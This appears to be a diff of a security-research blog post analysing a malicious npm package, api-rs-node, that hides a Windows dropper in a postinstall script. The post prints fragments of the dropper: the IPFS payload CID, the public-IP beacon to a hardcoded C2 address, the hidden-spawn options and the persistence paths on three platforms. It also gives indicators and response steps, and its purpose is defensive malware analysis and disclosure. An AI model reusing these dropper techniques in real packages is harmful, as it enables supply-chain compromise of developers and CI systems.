@@ -6,13 +6,11 @@ packageName: api-rs-node
 ecosystem: npm
 ---
 
-A few hours after [system-user-identifier-cli](/discoveries/2026/05/system-user-identifier-cli/) was published from a throwaway gmail, a different gmail published `api-rs-node@4.3.1`. Same calendar day, different shape. The first package was 799 bytes and one stanza of bash; this one is a polished marketing README, a 292-line dropper, and a tarball that quietly carries the attacker's filesystem layout.
-
-*An earlier draft of this same dropper, with the binary still bundled in the tarball, was published 5½ hours earlier as [`@devcarron/clob@2.73.0`](/discoveries/2026/05/devcarron-clob/) from a separate gmail. Same author, same payload — see that post for the comparison and the proof.*
+`api-rs-node@4.3.1` sells itself as a "high-performance Rust bridge"; it is a 292-line Windows dropper wrapped in a polished README, and its tarball ships the author's own filesystem layout by accident. An earlier draft went out 5½ hours before as [`@devcarron/clob@2.73.0`](/discoveries/2026/05/devcarron-clob/) from a separate gmail — same author, same payload, proof in that post.
 
 ## Stage 1: `clob.js`
 
-The cover is a "Rust ↔ Node.js Bridge" README — feature list with emojis, benchmark table where pure JS loses by 7×, MIT License dated 2026, install instructions still reading `npm install your-package-name`. The `package.json` has no author, no license, no keywords, and one script:
+The README is a polished Rust-bridge marketing page down to a benchmark table, but its install line still reads `npm install your-package-name`; the `package.json` carries no author, no license, no keywords, and one `postinstall` script:
 
 <pre class="lang-js"><code>{
   <span class="tok-str">"name"</span>: <span class="tok-str">"api-rs-node"</span>,
@@ -23,27 +21,27 @@ The cover is a "Rust ↔ Node.js Bridge" README — feature list with emojis, be
 }
 </code></pre>
 
-`clob.js` is wired for Windows only — `MAC_URL` and `LINUX_URL` are still `null` with `TODO` comments:
+`clob.js` is wired for Windows only; the mac and Linux URLs are still `null` with `TODO` comments:
 
 <pre class="lang-js"><code><span class="tok-kw">const</span> WIN_CID   = <span class="tok-str">'bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa'</span>;
 <span class="tok-kw">const</span> MAC_URL   = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set macOS binary URL</span>
 <span class="tok-kw">const</span> LINUX_URL = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set Linux binary URL</span>
 </code></pre>
 
-The dropper tries four IPFS gateways for `WIN_CID` in sequence, then writes the result to `%LOCALAPPDATA%\windows defender host.exe`:
+It tries four IPFS gateways for `WIN_CID` in sequence, writes the result to `%LOCALAPPDATA%\windows defender host.exe`, registers persistence on all three platforms (the mac and Linux branches register and then bail with no payload), then POSTs the host's public IP — fetched from `api.ipify.org` — to a hardcoded IPv4 on a port that doubles as the year.
+
+Gateways:
 
 - `violet-tricky-quelea-562.mypinata.cloud` (private Pinata, optional `PINATA_GATEWAY_TOKEN`)
 - `cloudflare-ipfs.com`
 - `gateway.pinata.cloud`
 - `ipfs.io`
 
-Persistence is wired for all three platforms even though only Windows downloads anything:
+Persistence:
 
 - **Windows:** hidden VBS launcher (`oShell.Run "...exe", 0, False`) + `HKCU\…\Run`
 - **macOS:** `~/Library/LaunchAgents/com.clob.agent.plist` with `RunAtLoad=true`
 - **Linux:** `~/.config/autostart/clob.desktop`
-
-The mac and linux branches register persistence and bail when their URLs are still null. After the binary lands the script asks `api.ipify.org` for the host's public IP and POSTs it to a hardcoded IPv4 on a port that doubles as the year:
 
 <pre class="lang-js"><code><span class="tok-kw">const</span> reportPath = <span class="tok-tmpl">`/api/urls?url=<span class="tok-tmpl-expr">${encodeURIComponent(ip)}</span>`</span>;
 <span class="tok-kw">const</span> options = {
@@ -54,18 +52,16 @@ The mac and linux branches register persistence and bail when their URLs are sti
 };
 </code></pre>
 
-The launcher is the standard hidden-spawn recipe and every failure path swallows the error:
+Standard hidden-spawn recipe, every failure path silent:
 
 - Spawn options: `detached: true`, `stdio: 'ignore'`, `windowsHide: true`, `child.unref()`
 - Failed download: silent `fs.unlink` on the partial file
 - Timed-out install: `process.exit(0)` with no log
 - Every catch block: `catch (_) {}`
 
-A Windows campaign that intends to grow.
-
 ## The leak
 
-The tarball is seven files, not two: alongside `clob.js`, `package.json`, and the README sit a `config/` directory with two JSON files and a `logs/` directory with two empty log files, none referenced by the code. `config/meta_data.json` is the surprise:
+The tarball holds seven files, not two: a `config/` and `logs/` directory the code never references, leftover from the author's own file-explorer tool. `config/meta_data.json`:
 
 <pre><code>{
   "version": "0.2.3",
@@ -83,11 +79,11 @@ The tarball is seven files, not two: alongside `clob.js`, `package.json`, and th
 }
 </code></pre>
 
-These files come from the author's own file-explorer scaffolding (`0.2.3` is that tool's version) — when they ran `npm publish` from `E:\getting IP and check list\clob-downloader\`, the tool's bookkeeping went with it. The bundle records the project's working name (`clob-downloader`, inside a directory literally named `getting IP and check list`), the Windows username `mist`, the four-volume NTFS layout, and lifetime read/write byte totals per volume — a fingerprint that survives reformats less than a serial number but more than an IP. The dropper was written carefully — section dividers, redirect handling, abortable promises, a 15-second install timeout — but the packaging was not.
+Publishing from `E:\getting IP and check list\clob-downloader\` dragged the tool's bookkeeping along: the Windows username `mist`, the project's working name, a four-volume NTFS layout, and lifetime per-volume read/write byte totals — a careful dropper undone by careless packaging.
 
 ## Stage 2: what the CID serves
 
-The CID resolves to a 4 MB Windows PE32+. The PDB path was not stripped:
+The CID resolves to a 4 MB Windows PE32+ with its PDB path intact — a complete Tauri-style desktop app, an Axum + Hyper + Tokio server fronting a React file-explorer UI whose own `config/` metadata is what leaked into the tarball.
 
 | Field | Value |
 | --- | --- |
@@ -97,7 +93,7 @@ The CID resolves to a 4 MB Windows PE32+. The PDB path was not stripped:
 | Build timestamp | `2026-05-25T08:28:35Z` (nine hours before the tarball) |
 | Toolchain | MSVC 14.44, no packer, full Rust crate paths in place |
 
-The binary is a complete Tauri-style desktop application — an Axum + Hyper + Tokio HTTP server with a React/JS file-explorer UI baked into `.rdata`:
+Server surface:
 
 | Field | Value |
 | --- | --- |
@@ -107,29 +103,29 @@ The binary is a complete Tauri-style desktop application — an Axum + Hyper + T
 | Required env vars | `HOST`, `PORT`, `EXPLR_UI`, `AUTH_TOKEN` |
 | Missing-config behaviour | errors `Invalid HOST/PORT` and exits before binding |
 
-The Tauri `invoke` surface enumerates to 53 commands. Most are filesystem and config operations; four are execution endpoints that make remote shell a first-class feature:
+Remote-execution endpoints (4 of 53 `invoke` commands):
 
 - `execute_command`
 - `execute_command_improved`
 - `execute_command_with_timeout`
 - `request_full_disk_access`
 
-The bundled `config/` files in the tarball are this same application's own metadata; the cover identity is internally consistent.
+Nothing in the binary indicates a stealer, and cleave's three hits are substring false positives off the React UI.
 
-Nothing in the binary indicates a stealer. Every indicator a stealer would carry is absent:
+Stealer markers, all absent:
 
 - Browser creds: `Login Data`, `Cookies.db`, `key3.db`, `Local State`, `logins.json`, `nss3.dll`
 - Wallets / seeds: MetaMask, Phantom, Exodus, Atomic, Electrum, `wallet.dat`, mnemonic dictionaries
 - Tokens: Discord, Telegram
 - DPAPI: `CryptUnprotectData`
 
-cleave fires three substring false positives on the React UI:
+False positives:
 
 - `credential-access/browser/dpapi` on `v11` — a UI version string, not the DPAPI marker
 - `collection/file-targeting/filter` on `.seed` from a MIME table
 - `exfiltration/stealer/file` on `FindFirstVolumeW`, used to populate the drive sidebar
 
-The only traits that survive review are the Tauri surface itself:
+Surviving traits — the Tauri surface itself:
 
 |  | Trait | What it caught |
 | --- | --- | --- |
@@ -138,25 +134,15 @@ The only traits that survive review are the Tauri surface itself:
 
 ## The campaign does not close the loop
 
-For an engineer triaging this: as shipped, the chain between dropper and binary does not actually connect.
+As shipped, the chain between dropper and binary never connects, leaving the realistic victim population — a publicly addressable Windows host with all four env vars exported, nothing holding port 80, running `npm install` — approximately empty:
 
-1. **Windows-only.** The macOS and Linux branches in `clob.js` carry `MAC_URL = null` and `LINUX_URL = null` and exit before downloading anything. The launchd plist and XDG autostart code is written and unreachable.
-2. **No environment handoff.** Neither `spawn(exePath, [], { detached: true, stdio: 'ignore' })` nor the Run-key value `wscript.exe //nologo "<vbsPath>"` propagates `HOST`, `PORT`, `EXPLR_UI`, or `AUTH_TOKEN`. The server hits its `Invalid HOST/PORT` path on every launch and exits. Persistence survives; the listener does not.
-3. **NAT assumption.** `clob.js` POSTs the host's public IP from `api.ipify.org` to `170.205.31.203:2026` with a literal `:80` suffix. For any host behind NAT — every developer workstation and every hosted CI runner — that address belongs to the edge router, not the box that ran `npm install`. There is nothing for C2 to connect back to.
-
-The realistic victim is a Windows host directly addressable on the public internet, with those four environment variables exported in the user's session, with nothing on `http.sys` already holding port 80, running `npm install api-rs-node`. That population is approximately empty. Two of the three gaps are coding bugs; the third is a design assumption the author has not reckoned with. The package is worth detecting and blocking, but no installed host as currently shipped ends up with a working backdoor.
-
-## Why this works
-
-The execution surface is `postinstall`, which scanners do flag — but `clob.js` is structured like a normal native-module bootstrapper that downloads a prebuilt binary for the user's platform, which is what `node-pre-gyp`, `prebuild-install`, and dozens of legitimate packages do at install time. The malicious version doesn't need to look different; the binary just has to be the payload.
-
-IPFS staging is what makes delivery hard to disrupt. The CID is a content hash, so whoever holds the underlying bytes can serve them from any gateway; taking down the Pinata project removes one path while the bytes remain pinned wherever the actor or any sympathetic peer keeps them, and `ipfs.io` will happily proxy them. There is no single domain to seize.
-
-The `TODO`s and the leaked dev-env both say the same thing: this is iteration, not a finished campaign. `4.3.0` published at 17:36 UTC, `4.3.1` ninety minutes later — long enough to test, short enough to be the same sitting.
+- **Windows-only.** The mac and Linux branches exit before downloading; their persistence code is written but unreachable.
+- **No environment handoff.** Nothing propagates `HOST`, `PORT`, `EXPLR_UI`, or `AUTH_TOKEN`, so the server hits `Invalid HOST/PORT` and exits on every launch — persistence survives, the listener does not.
+- **NAT assumption.** The beacon reports the host's *public* IP, which behind NAT belongs to the edge router, not the box that ran `npm install`; C2 has nothing to connect back to.
 
 ## Dropper traits
 
-The [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410) returns malicious at probability 1.0. The [cleave-traits](https://codeberg.org/atomdrift/cleave-traits) cluster around four behaviours: IPFS delivery, stealth spawn, multi-platform persistence, and the Windows Defender masquerade.
+The [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410) returns malicious at probability 1.0, clustering on IPFS delivery, stealth spawn, multi-platform persistence, and the Windows Defender masquerade:
 
 |  | Trait | What it caught |
 | --- | --- | --- |
@@ -172,15 +158,9 @@ The [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83
 | <span class="sev-dot suspicious" title="suspicious"></span> | `persistence/system/init/boot` | `~/.config/autostart/clob.desktop` |
 | <span class="sev-dot notable" title="notable"></span> | `persistence/login/registry/autostart` | `HKCU\…\Run` with VBS launcher |
 
-The reverse-shell pattern from the prior post is absent. What cleave flags here is *bootstrap that should not be one*: a manifest with no metadata invoking a 292-line postinstall script that downloads a platform-specific binary from IPFS and registers it for autostart.
-
-## Impact
-
-`postinstall` runs whenever the package is installed — by a developer typing `npm i api-rs-node`, by CI installing transitively, by anything resolving a lockfile that includes it. The Windows branch drops `windows defender host.exe` into `%LOCALAPPDATA%`, registers it under HKCU Run via a hidden VBS launcher, spawns it detached, and beacons the host's public IP to `170.205.31.203:2026`. The dropped binary is whatever the actor pinned at the CID at the time — content-addressed, but the content is the actor's to choose. The mac and linux branches abort early today; tomorrow they may not.
-
 ## Likely actor
 
-Two versions in ninety minutes from one fresh gmail; an earlier draft ([`@devcarron/clob@2.73.0`](/discoveries/2026/05/devcarron-clob/)) was published 5½ hours before `4.3.0` from a *different* fresh gmail. The two accounts publish from the same Windows machine — the bundled `meta_data.json` is byte-identical across both packages, naming the same four-volume NTFS drive layout and the same username (`mist`).
+Two `api-rs-node` versions went out ninety minutes apart from one fresh gmail, and the byte-identical `meta_data.json` ties them to the [`@devcarron/clob`](/discoveries/2026/05/devcarron-clob/) sibling published 5½ hours earlier from a different gmail — same Windows machine, same `mist` user, novice OPSEC paired with rising craftsmanship.
 
 | Field | Value |
 | --- | --- |
@@ -190,8 +170,6 @@ Two versions in ninety minutes from one fresh gmail; an earlier draft ([`@devcar
 | Files in tarball | 7 (`clob.js`, `package.json`, `README.md`, `config/×2`, `logs/×2`) |
 | Sibling publisher | `devcarron <devcarron@gmail.com>` (`@devcarron/clob@2.73.0`, `2026-05-25T11:59:04Z`) |
 | Author host (from bundled `meta_data.json`) | Windows x86_64, username `mist`, project dir `E:\getting IP and check list\clob-downloader` |
-
-Higher craftsmanship than the prior post — section comments, redirect handling, multi-gateway fallback, three-platform persistence wiring — paired with novice OPSEC: the package ships the author's machine fingerprint, the tooling version, the working name of their project, and even their lifetime per-volume disk read/write totals. The Pinata CID, the `2026` port, the unfinished `*_URL` constants, and the unpolished README all read as one person's second iteration on a stager they intend to refine. The first iteration — `@devcarron/clob` — was louder, bundled the binary, and made the same NAT and env-var mistakes; the refinements between the two are visible. The dropper is more dangerous than `system-user-identifier-cli`'s reverse shell — quieter, persistent, content-addressed — and the author is more careless than the one who shipped the shell.
 
 ## Indicators
 
@@ -215,6 +193,7 @@ Higher craftsmanship than the prior post — section comments, redirect handling
 
 ## Response
 
-Search npm caches, CI logs, and `%LOCALAPPDATA%` (and the mac/linux paths above) for the dropped filenames. In egress telemetry: outbound to `170.205.31.203:2026`, to `api.ipify.org`, and to the four IPFS gateways above carrying that CID. Rotate any credentials available to a user that ran `npm install` on a Windows host that resolved `api-rs-node` since 2026-05-25. Treat the binary at the CID as untrusted; pull it for analysis from a host that does not share an identity with anything else you care about.
-
-The full trait list and raw analysis live in the [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410); registry metadata came from `https://registry.npmjs.org/api-rs-node` and the source from the published tarball.
+- Hunt npm caches, CI logs, and `%LOCALAPPDATA%` (plus the mac/Linux paths above) for the dropped filenames.
+- In egress telemetry: outbound to `170.205.31.203:2026`, to `api.ipify.org`, and to the four gateways above carrying that CID.
+- Rotate credentials reachable by any user that ran `npm install` on a Windows host that resolved `api-rs-node` since 2026-05-25.
+- Treat the CID binary as untrusted; pull it for analysis from a throwaway identity.
